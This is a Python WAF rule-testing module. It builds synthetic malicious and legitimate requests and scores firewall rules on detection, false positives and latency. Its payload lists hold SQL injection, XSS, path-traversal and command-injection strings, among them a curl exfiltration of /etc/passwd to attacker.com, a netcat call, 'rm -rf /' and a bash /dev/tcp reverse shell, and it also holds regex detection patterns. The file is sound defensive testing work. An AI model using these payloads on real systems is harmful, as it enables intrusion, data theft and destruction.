# -*- coding: utf-8 -*-
"""
WAF Rule Tester - SEC-010

Provides testing capabilities for WAF rules before deployment.
Generates test payloads, estimates false positive rates, and
measures performance impact.

Classes:
    - WAFRuleTester: Main class for rule testing operations
    - TestRequest: Represents a synthetic test request
    - TestResult: Result of testing a rule against a request
    - TestReport: Comprehensive test report

Example:
    >>> from greenlang.infrastructure.waf_management.rule_tester import WAFRuleTester
    >>> tester = WAFRuleTester(config)
    >>> test_requests = tester.generate_test_requests("sql_injection")
    >>> results = await tester.test_rule(rule, test_requests)
    >>> report = tester.generate_test_report(results)
"""

from __future__ import annotations

import hashlib
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)

from greenlang.infrastructure.waf_management.config import WAFConfig, get_config
from greenlang.infrastructure.waf_management.models import (
    RuleAction,
    RuleType,
    WAFRule,
)


# ---------------------------------------------------------------------------
# Test Data Models
# ---------------------------------------------------------------------------


@dataclass
class TestRequest:
    """Synthetic test request for rule testing.

    Attributes:
        id: Unique request identifier.
        method: HTTP method (GET, POST, etc.).
        uri: Request URI path.
        query_string: Query string parameters.
        headers: HTTP headers dictionary.
        body: Request body content.
        source_ip: Source IP address.
        user_agent: User-Agent header value.
        is_malicious: Whether this is a known malicious request.
        attack_type: Type of attack this request represents.
        description: Human-readable description of the request.
    """

    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    method: str = "GET"
    uri: str = "/"
    query_string: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    source_ip: str = "192.0.2.1"
    user_agent: str = "Mozilla/5.0 (Test Agent)"
    is_malicious: bool = False
    attack_type: Optional[str] = None
    description: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "id": self.id,
            "method": self.method,
            "uri": self.uri,
            "query_string": self.query_string,
            "headers": self.headers,
            "body": self.body,
            "source_ip": self.source_ip,
            "user_agent": self.user_agent,
            "is_malicious": self.is_malicious,
            "attack_type": self.attack_type,
            "description": self.description,
        }


@dataclass
class TestResult:
    """Result of testing a single request against a rule.

    Attributes:
        request_id: ID of the test request.
        rule_name: Name of the rule tested.
        matched: Whether the rule matched the request.
        action_taken: What action the rule would take.
        is_correct: Whether the result was correct (true positive/negative).
        is_false_positive: Whether this is a false positive.
        is_false_negative: Whether this is a false negative.
        evaluation_time_us: Time to evaluate in microseconds.
        matched_conditions: Which conditions matched.
    """

    request_id: str
    rule_name: str
    matched: bool
    action_taken: str
    is_correct: bool = True
    is_false_positive: bool = False
    is_false_negative: bool = False
    evaluation_time_us: int = 0
    matched_conditions: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "request_id": self.request_id,
            "rule_name": self.rule_name,
            "matched": self.matched,
            "action_taken": self.action_taken,
            "is_correct": self.is_correct,
            "is_false_positive": self.is_false_positive,
            "is_false_negative": self.is_false_negative,
            "evaluation_time_us": self.evaluation_time_us,
            "matched_conditions": self.matched_conditions,
        }


@dataclass
class TestReport:
    """Comprehensive test report for a WAF rule.

    Attributes:
        rule_name: Name of the tested rule.
        rule_type: Type of the rule.
        total_requests: Total requests tested.
        total_matched: Requests that matched the rule.
        true_positives: Correct detections of malicious requests.
        true_negatives: Correct passes of legitimate requests.
        false_positives: Legitimate requests incorrectly blocked.
        false_negatives: Malicious requests incorrectly passed.
        detection_rate: Percentage of malicious requests detected.
        false_positive_rate: Percentage of false positives.
        average_latency_us: Average evaluation latency.
        p95_latency_us: 95th percentile latency.
        p99_latency_us: 99th percentile latency.
        test_duration_seconds: Total test duration.
        recommendations: Suggested improvements.
        generated_at: When the report was generated.
    """

    rule_name: str
    rule_type: str
    total_requests: int = 0
    total_matched: int = 0
    true_positives: int = 0
    true_negatives: int = 0
    false_positives: int = 0
    false_negatives: int = 0
    detection_rate: float = 0.0
    false_positive_rate: float = 0.0
    average_latency_us: float = 0.0
    p95_latency_us: float = 0.0
    p99_latency_us: float = 0.0
    test_duration_seconds: float = 0.0
    recommendations: List[str] = field(default_factory=list)
    generated_at: datetime = field(
        default_factory=lambda: datetime.now(timezone.utc)
    )

    @property
    def accuracy(self) -> float:
        """Calculate overall accuracy."""
        total = self.true_positives + self.true_negatives + \
                self.false_positives + self.false_negatives
        if total == 0:
            return 0.0
        return (self.true_positives + self.true_negatives) / total * 100

    @property
    def precision(self) -> float:
        """Calculate precision (positive predictive value)."""
        total_positive = self.true_positives + self.false_positives
        if total_positive == 0:
            return 0.0
        return self.true_positives / total_positive * 100

    @property
    def recall(self) -> float:
        """Calculate recall (sensitivity)."""
        total_actual_positive = self.true_positives + self.false_negatives
        if total_actual_positive == 0:
            return 0.0
        return self.true_positives / total_actual_positive * 100

    @property
    def f1_score(self) -> float:
        """Calculate F1 score."""
        if self.precision + self.recall == 0:
            return 0.0
        return 2 * (self.precision * self.recall) / (self.precision + self.recall)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "rule_name": self.rule_name,
            "rule_type": self.rule_type,
            "total_requests": self.total_requests,
            "total_matched": self.total_matched,
            "true_positives": self.true_positives,
            "true_negatives": self.true_negatives,
            "false_positives": self.false_positives,
            "false_negatives": self.false_negatives,
            "detection_rate": self.detection_rate,
            "false_positive_rate": self.false_positive_rate,
            "accuracy": self.accuracy,
            "precision": self.precision,
            "recall": self.recall,
            "f1_score": self.f1_score,
            "average_latency_us": self.average_latency_us,
            "p95_latency_us": self.p95_latency_us,
            "p99_latency_us": self.p99_latency_us,
            "test_duration_seconds": self.test_duration_seconds,
            "recommendations": self.recommendations,
            "generated_at": self.generated_at.isoformat(),
        }


# ---------------------------------------------------------------------------
# Test Payload Generators
# ---------------------------------------------------------------------------


class SQLInjectionPayloadGenerator:
    """Generates SQL injection test payloads."""

    PAYLOADS = [
        # Classic SQL injection
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "1'; DELETE FROM users WHERE '1'='1",
        "' UNION SELECT * FROM users --",
        "1 OR 1=1",
        "1' OR '1'='1",

        # Authentication bypass
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 1=1#",
        "' OR 1=1/*",

        # Error-based injection
        "' AND 1=CONVERT(int, @@version)--",
        "' AND 1=1 UNION SELECT NULL, table_name FROM information_schema.tables--",

        # Time-based blind injection
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)#",

        # Unicode/encoding bypass
        "%27%20OR%20%271%27%3D%271",
        "\\' OR 1=1--",

        # Boolean-based blind injection
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND '1'='1",

        # Stacked queries
        "'; INSERT INTO users VALUES('hacker', 'password')--",

        # Second order injection
        "admin'-- -",
    ]

    @classmethod
    def generate(cls) -> List[TestRequest]:
        """Generate SQL injection test requests."""
        requests = []
        for i, payload in enumerate(cls.PAYLOADS):
            # Test in query string
            requests.append(TestRequest(
                method="GET",
                uri="/api/users",
                query_string=f"id={payload}",
                is_malicious=True,
                attack_type="sql_injection",
                description=f"SQLi payload in query string: {payload[:30]}...",
            ))

            # Test in body
            requests.append(TestRequest(
                method="POST",
                uri="/api/login",
                body=f'{{"username": "{payload}", "password": "test"}}',
                headers={"Content-Type": "application/json"},
                is_malicious=True,
                attack_type="sql_injection",
                description=f"SQLi payload in body: {payload[:30]}...",
            ))

        return requests


class XSSPayloadGenerator:
    """Generates XSS test payloads."""

    PAYLOADS = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",

        # Event handlers
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",

        # Encoded payloads
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",

        # JavaScript URL
        "javascript:alert('XSS')",
        "<a href='javascript:alert(1)'>click</a>",

        # Data URL
        "<a href='data:text/html,<script>alert(1)</script>'>click</a>",

        # SVG-based
        "<svg/onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script></svg>",

        # Attribute injection
        '" onfocus="alert(\'XSS\')" autofocus="',
        "' onfocus='alert(1)' autofocus='",

        # CSS injection
        "<style>body{background:url('javascript:alert(1)')}</style>",

        # Template injection
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('XSS')}",
    ]

    @classmethod
    def generate(cls) -> List[TestRequest]:
        """Generate XSS test requests."""
        requests = []
        for payload in cls.PAYLOADS:
            # Test in query string
            requests.append(TestRequest(
                method="GET",
                uri="/search",
                query_string=f"q={payload}",
                is_malicious=True,
                attack_type="xss",
                description=f"XSS payload in query: {payload[:30]}...",
            ))

            # Test in body
            requests.append(TestRequest(
                method="POST",
                uri="/api/comments",
                body=f'{{"comment": "{payload}"}}',
                headers={"Content-Type": "application/json"},
                is_malicious=True,
                attack_type="xss",
                description=f"XSS payload in body: {payload[:30]}...",
            ))

        return requests


class PathTraversalPayloadGenerator:
    """Generates path traversal test payloads."""

    PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00",
        "....//....//....//etc/passwd%00.jpg",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    ]

    @classmethod
    def generate(cls) -> List[TestRequest]:
        """Generate path traversal test requests."""
        requests = []
        for payload in cls.PAYLOADS:
            requests.append(TestRequest(
                method="GET",
                uri=f"/files/{payload}",
                is_malicious=True,
                attack_type="path_traversal",
                description=f"Path traversal: {payload[:30]}...",
            ))
            requests.append(TestRequest(
                method="GET",
                uri="/download",
                query_string=f"file={payload}",
                is_malicious=True,
                attack_type="path_traversal",
                description=f"Path traversal in query: {payload[:30]}...",
            ))
        return requests


class CommandInjectionPayloadGenerator:
    """Generates command injection test payloads."""

    PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "$(cat /etc/passwd)",
        "`id`",
        "; ping -c 10 attacker.com",
        "| nc attacker.com 1234",
        "&& rm -rf /",
        "; curl http://attacker.com/?data=$(cat /etc/passwd)",
        "$(bash -i >& /dev/tcp/attacker.com/1234 0>&1)",
    ]

    @classmethod
    def generate(cls) -> List[TestRequest]:
        """Generate command injection test requests."""
        requests = []
        for payload in cls.PAYLOADS:
            requests.append(TestRequest(
                method="POST",
                uri="/api/execute",
                body=f'{{"command": "echo test{payload}"}}',
                headers={"Content-Type": "application/json"},
                is_malicious=True,
                attack_type="command_injection",
                description=f"Command injection: {payload[:30]}...",
            ))
        return requests


class LegitimateRequestGenerator:
    """Generates legitimate test requests for false positive testing."""

    SAMPLE_REQUESTS = [
        # Normal API requests
        {"method": "GET", "uri": "/api/users", "query_string": "page=1&limit=20"},
        {"method": "GET", "uri": "/api/products", "query_string": "category=electronics&sort=price"},
        {"method": "POST", "uri": "/api/login", "body": '{"username": "john@example.com", "password": "securePass123!"}'},
        {"method": "POST", "uri": "/api/orders", "body": '{"product_id": "123", "quantity": 2}'},

        # Requests with special but legitimate characters
        {"method": "GET", "uri": "/search", "query_string": "q=O'Reilly+Books"},  # Apostrophe in name
        {"method": "GET", "uri": "/search", "query_string": "q=1+%2B+1+%3D+2"},  # Math expression
        {"method": "POST", "uri": "/api/comments", "body": '{"text": "This is <bold>important</bold>"}'},  # HTML-like

        # SQL-like but legitimate content
        {"method": "POST", "uri": "/api/articles", "body": '{"title": "SQL SELECT statement tutorial"}'},
        {"method": "GET", "uri": "/docs", "query_string": "topic=DROP+TABLE+command"},

        # URLs with encoding
        {"method": "GET", "uri": "/files/my%20document.pdf"},
        {"method": "GET", "uri": "/users/user%40example.com"},

        # Normal user agents
        {"method": "GET", "uri": "/", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        {"method": "GET", "uri": "/", "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"},

        # API requests with various content types
        {"method": "POST", "uri": "/api/upload", "headers": {"Content-Type": "multipart/form-data"}},
        {"method": "PUT", "uri": "/api/users/123", "body": '{"name": "John Doe", "email": "john@example.com"}'},

        # GraphQL-like queries (should not be blocked)
        {"method": "POST", "uri": "/graphql", "body": '{"query": "{ user(id: 1) { name email } }"}'},
    ]

    @classmethod
    def generate(cls) -> List[TestRequest]:
        """Generate legitimate test requests."""
        requests = []
        for sample in cls.SAMPLE_REQUESTS:
            requests.append(TestRequest(
                method=sample.get("method", "GET"),
                uri=sample.get("uri", "/"),
                query_string=sample.get("query_string", ""),
                body=sample.get("body", ""),
                headers=sample.get("headers", {}),
                user_agent=sample.get("user_agent", "Mozilla/5.0 (Test Agent)"),
                is_malicious=False,
                attack_type=None,
                description=f"Legitimate request: {sample.get('method', 'GET')} {sample.get('uri', '/')}",
            ))
        return requests


# ---------------------------------------------------------------------------
# WAF Rule Tester
# ---------------------------------------------------------------------------


class WAFRuleTester:
    """Tests WAF rules against synthetic requests.

    Provides comprehensive testing capabilities including:
    - Malicious payload testing
    - False positive estimation
    - Latency impact measurement
    - Test report generation

    Example:
        >>> tester = WAFRuleTester(config)
        >>> test_requests = tester.generate_test_requests("sql_injection")
        >>> results = await tester.test_rule(rule, test_requests)
        >>> report = tester.generate_test_report(results)
    """

    # Mapping of rule types to payload generators
    PAYLOAD_GENERATORS = {
        "sql_injection": SQLInjectionPayloadGenerator,
        "xss": XSSPayloadGenerator,
        "path_traversal": PathTraversalPayloadGenerator,
        "command_injection": CommandInjectionPayloadGenerator,
    }

    def __init__(self, config: Optional[WAFConfig] = None):
        """Initialize the WAF rule tester.

        Args:
            config: WAF configuration. If None, loads from environment.
        """
        self.config = config or get_config()

    def generate_test_requests(
        self,
        rule_type: str,
        include_legitimate: bool = True,
        malicious_count: Optional[int] = None,
        legitimate_count: int = 50,
    ) -> List[TestRequest]:
        """Generate test requests for a rule type.

        Args:
            rule_type: Type of rule to generate tests for.
            include_legitimate: Whether to include legitimate requests.
            malicious_count: Max malicious requests to generate. None for all.
            legitimate_count: Number of legitimate requests to include.

        Returns:
            List of test requests.
        """
        requests = []

        # Generate malicious payloads
        if rule_type in self.PAYLOAD_GENERATORS:
            generator = self.PAYLOAD_GENERATORS[rule_type]
            malicious = generator.generate()
            if malicious_count is not None:
                malicious = malicious[:malicious_count]
            requests.extend(malicious)
        else:
            logger.warning(
                "No payload generator for rule type: %s. "
                "Using generic test requests.",
                rule_type,
            )

        # Include legitimate requests for false positive testing
        if include_legitimate:
            legitimate = LegitimateRequestGenerator.generate()
            requests.extend(legitimate[:legitimate_count])

        logger.info(
            "Generated %d test requests for rule type %s "
            "(%d malicious, %d legitimate)",
            len(requests),
            rule_type,
            len([r for r in requests if r.is_malicious]),
            len([r for r in requests if not r.is_malicious]),
        )

        return requests

    async def test_rule(
        self,
        rule: WAFRule,
        test_requests: List[TestRequest],
    ) -> List[TestResult]:
        """Test a WAF rule against a list of requests.

        This method simulates how the rule would evaluate each request
        without actually deploying to AWS WAF.

        Args:
            rule: The WAF rule to test.
            test_requests: List of test requests.

        Returns:
            List of test results.
        """
        results = []

        for request in test_requests:
            start_time = time.perf_counter_ns()

            # Simulate rule evaluation
            matched, matched_conditions = self._evaluate_rule(rule, request)

            end_time = time.perf_counter_ns()
            evaluation_time_us = (end_time - start_time) // 1000

            # Determine action
            action_taken = rule.action.value if matched else "allow"

            # Determine if result is correct
            if matched and request.is_malicious:
                # True positive - correctly detected malicious request
                is_correct = True
                is_false_positive = False
                is_false_negative = False
            elif not matched and not request.is_malicious:
                # True negative - correctly allowed legitimate request
                is_correct = True
                is_false_positive = False
                is_false_negative = False
            elif matched and not request.is_malicious:
                # False positive - blocked legitimate request
                is_correct = False
                is_false_positive = True
                is_false_negative = False
            else:
                # False negative - missed malicious request
                is_correct = False
                is_false_positive = False
                is_false_negative = True

            results.append(TestResult(
                request_id=request.id,
                rule_name=rule.name,
                matched=matched,
                action_taken=action_taken,
                is_correct=is_correct,
                is_false_positive=is_false_positive,
                is_false_negative=is_false_negative,
                evaluation_time_us=evaluation_time_us,
                matched_conditions=matched_conditions,
            ))

        return results

    def _evaluate_rule(
        self,
        rule: WAFRule,
        request: TestRequest,
    ) -> Tuple[bool, List[str]]:
        """Simulate rule evaluation against a request.

        Args:
            rule: The WAF rule.
            request: The test request.

        Returns:
            Tuple of (matched, matched_conditions).
        """
        matched_conditions = []

        # Rate limit rules - simulate based on source IP
        if rule.rule_type == RuleType.RATE_LIMIT:
            # For testing, we assume rate limit would match if explicitly marked
            # In reality, this would need request history
            return False, []

        # Geo-block rules - simulate based on configured countries
        if rule.rule_type == RuleType.GEO_BLOCK:
            # For testing, we don't have geo info, so return no match
            return False, []

        # SQL injection detection
        if rule.rule_type == RuleType.SQL_INJECTION:
            sqli_patterns = [
                r"(?i)(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|FROM|WHERE)\b)",
                r"(?i)(--|\#|/\*)",
                r"(?i)('|\")\s*(OR|AND)\s*('|\"|1\s*=\s*1)",
                r"(?i)(WAITFOR\s+DELAY|SLEEP\s*\()",
            ]
            content = f"{request.uri}{request.query_string}{request.body}"
            for pattern in sqli_patterns:
                if re.search(pattern, content):
                    matched_conditions.append(f"SQLi pattern: {pattern[:30]}")
            return len(matched_conditions) > 0, matched_conditions

        # XSS detection
        if rule.rule_type == RuleType.XSS:
            xss_patterns = [
                r"(?i)<script[^>]*>",
                r"(?i)javascript\s*:",
                r"(?i)on(load|error|click|mouseover)\s*=",
                r"(?i)<(img|svg|body|input)[^>]*(onerror|onload|onfocus)",
            ]
            content = f"{request.uri}{request.query_string}{request.body}"
            for pattern in xss_patterns:
                if re.search(pattern, content):
                    matched_conditions.append(f"XSS pattern: {pattern[:30]}")
            return len(matched_conditions) > 0, matched_conditions

        # Path traversal detection
        if rule.rule_type == RuleType.PATH_TRAVERSAL:
            traversal_patterns = [
                r"(\.\.[\\/]){2,}",
                r"(%2e%2e[\\/]){2,}",
                r"(%c0%ae){2,}",
                r"/etc/passwd",
                r"\\windows\\system32",
            ]
            content = f"{request.uri}{request.query_string}"
            for pattern in traversal_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    matched_conditions.append(f"Traversal pattern: {pattern[:30]}")
            return len(matched_conditions) > 0, matched_conditions

        # Command injection detection
        if rule.rule_type == RuleType.COMMAND_INJECTION:
            cmd_patterns = [
                r"[;&|`$]",
                r"\$\([^)]+\)",
                r"`[^`]+`",
            ]
            content = request.body
            for pattern in cmd_patterns:
                if re.search(pattern, content):
                    matched_conditions.append(f"Command pattern: {pattern[:30]}")
            return len(matched_conditions) > 0, matched_conditions

        # Custom regex
        if rule.rule_type == RuleType.CUSTOM_REGEX and rule.regex_pattern:
            content = f"{request.uri}{request.query_string}{request.body}"
            if re.search(rule.regex_pattern, content, re.IGNORECASE):
                matched_conditions.append(f"Regex: {rule.regex_pattern[:30]}")
                return True, matched_conditions

        return False, []

    def estimate_false_positives(
        self,
        rule: WAFRule,
        legitimate_traffic: List[TestRequest],
    ) -> Dict[str, Any]:
        """Estimate false positive rate for a rule.

        Args:
            rule: The WAF rule to test.
            legitimate_traffic: List of known legitimate requests.

        Returns:
            Dictionary with false positive statistics.
        """
        if not legitimate_traffic:
            legitimate_traffic = LegitimateRequestGenerator.generate()

        false_positives = []
        total_tested = len(legitimate_traffic)

        for request in legitimate_traffic:
            matched, conditions = self._evaluate_rule(rule, request)
            if matched:
                false_positives.append({
                    "request": request.to_dict(),
                    "matched_conditions": conditions,
                })

        fp_rate = (len(false_positives) / total_tested * 100) if total_tested > 0 else 0.0

        result = {
            "rule_name": rule.name,
            "total_tested": total_tested,
            "false_positives_count": len(false_positives),
            "false_positive_rate": fp_rate,
            "acceptable": fp_rate < 2.0,  # PRD requirement: <2% FP rate
            "false_positive_samples": false_positives[:10],  # Sample of FPs
        }

        if fp_rate >= 2.0:
            result["recommendation"] = (
                "False positive rate exceeds 2% threshold. "
                "Consider refining rule conditions or using COUNT mode initially."
            )

        return result

    def measure_latency_impact(
        self,
        rule: WAFRule,
        sample_size: int = 1000,
    ) -> Dict[str, Any]:
        """Measure the latency impact of a rule.

        Args:
            rule: The WAF rule to test.
            sample_size: Number of requests to simulate.

        Returns:
            Dictionary with latency statistics.
        """
        latencies = []

        # Generate sample requests
        sample_requests = []
        for _ in range(sample_size):
            sample_requests.append(TestRequest(
                method="GET",
                uri="/api/test",
                query_string=f"id={uuid.uuid4()}",
            ))

        # Measure evaluation time
        for request in sample_requests:
            start_time = time.perf_counter_ns()
            self._evaluate_rule(rule, request)
            end_time = time.perf_counter_ns()
            latencies.append((end_time - start_time) / 1000)  # Convert to microseconds

        # Calculate statistics
        latencies.sort()
        avg_latency = sum(latencies) / len(latencies)
        p50_latency = latencies[len(latencies) // 2]
        p95_latency = latencies[int(len(latencies) * 0.95)]
        p99_latency = latencies[int(len(latencies) * 0.99)]
        max_latency = latencies[-1]

        result = {
            "rule_name": rule.name,
            "sample_size": sample_size,
            "average_latency_us": avg_latency,
            "p50_latency_us": p50_latency,
            "p95_latency_us": p95_latency,
            "p99_latency_us": p99_latency,
            "max_latency_us": max_latency,
            "acceptable": p99_latency < 1000,  # <1ms P99 target
        }

        if p99_latency >= 1000:
            result["recommendation"] = (
                "P99 latency exceeds 1ms target. "
                "Consider simplifying regex patterns or conditions."
            )

        return result

    def generate_test_report(
        self,
        results: List[TestResult],
        rule: Optional[WAFRule] = None,
    ) -> TestReport:
        """Generate a comprehensive test report.

        Args:
            results: List of test results.
            rule: Optional WAF rule for additional context.

        Returns:
            Comprehensive test report.
        """
        if not results:
            return TestReport(
                rule_name=rule.name if rule else "Unknown",
                rule_type=rule.rule_type.value if rule else "unknown",
            )

        # Calculate metrics
        total_requests = len(results)
        total_matched = sum(1 for r in results if r.matched)
        true_positives = sum(1 for r in results if r.matched and r.is_correct and not r.is_false_positive)
        true_negatives = sum(1 for r in results if not r.matched and r.is_correct)
        false_positives = sum(1 for r in results if r.is_false_positive)
        false_negatives = sum(1 for r in results if r.is_false_negative)

        # Calculate rates
        malicious_count = true_positives + false_negatives
        legitimate_count = true_negatives + false_positives

        detection_rate = (true_positives / malicious_count * 100) if malicious_count > 0 else 0.0
        fp_rate = (false_positives / legitimate_count * 100) if legitimate_count > 0 else 0.0

        # Calculate latency percentiles
        latencies = [r.evaluation_time_us for r in results]
        latencies.sort()
        avg_latency = sum(latencies) / len(latencies) if latencies else 0.0
        p95_latency = latencies[int(len(latencies) * 0.95)] if latencies else 0.0
        p99_latency = latencies[int(len(latencies) * 0.99)] if latencies else 0.0

        # Generate recommendations
        recommendations = []
        if detection_rate < 90:
            recommendations.append(
                f"Detection rate is {detection_rate:.1f}%. "
                f"Consider adding more detection patterns."
            )
        if fp_rate >= 2.0:
            recommendations.append(
                f"False positive rate is {fp_rate:.1f}%. "
                f"Consider refining conditions to reduce false positives."
            )
        if p99_latency > 1000:
            recommendations.append(
                f"P99 latency is {p99_latency:.0f}us. "
                f"Consider optimizing regex patterns."
            )
        if false_negatives > 0:
            recommendations.append(
                f"{false_negatives} malicious requests were not detected. "
                f"Review attack patterns that bypassed the rule."
            )

        return TestReport(
            rule_name=results[0].rule_name,
            rule_type=rule.rule_type.value if rule else "unknown",
            total_requests=total_requests,
            total_matched=total_matched,
            true_positives=true_positives,
            true_negatives=true_negatives,
            false_positives=false_positives,
            false_negatives=false_negatives,
            detection_rate=detection_rate,
            false_positive_rate=fp_rate,
            average_latency_us=avg_latency,
            p95_latency_us=p95_latency,
            p99_latency_us=p99_latency,
            recommendations=recommendations,
        )


__all__ = [
    "WAFRuleTester",
    "TestRequest",
    "TestResult",
    "TestReport",
    "SQLInjectionPayloadGenerator",
    "XSSPayloadGenerator",
    "PathTraversalPayloadGenerator",
    "CommandInjectionPayloadGenerator",
    "LegitimateRequestGenerator",
]
